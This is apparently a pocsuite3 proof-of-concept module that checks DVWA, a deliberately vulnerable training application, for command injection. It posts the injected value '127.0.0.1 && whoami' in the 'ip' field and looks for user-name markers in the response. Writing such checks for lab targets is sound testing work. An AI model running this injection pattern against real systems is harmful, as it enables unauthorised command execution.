# -*- coding: utf-8 -*-
from pocsuite3.api import POCBase, Output, register_poc, requests, VUL_TYPE


class POC(POCBase):
    name = 'DVWA Command Injection'
    vulType = VUL_TYPE.CODE_EXECUTION

    def _verify(self):
        result = {}
        target = self.url.rstrip('/')
        if "vulnerabilities/exec" in target.lower():
            if not target.endswith('.php'):
                target += '/index.php'

            # Windows/Linux 通用探测：执行 whoami
            payload = "127.0.0.1 && whoami"
            self.set_payload(payload)

            try:
                # 关键：必须带上 Submit 参数，且使用 POST 方式
                data = {'ip': payload, 'Submit': 'Submit'}
                res = requests.post(target, data=data, timeout=10)

                # 检查回显特征
                indicators = ["nt authority", "system", "www-data", "uid=", "root"]
                if any(ind in res.text.lower() for ind in indicators):
                    result['VerifyInfo'] = {"URL": target, "Payload": payload}
            except:
                pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


register_poc(POC)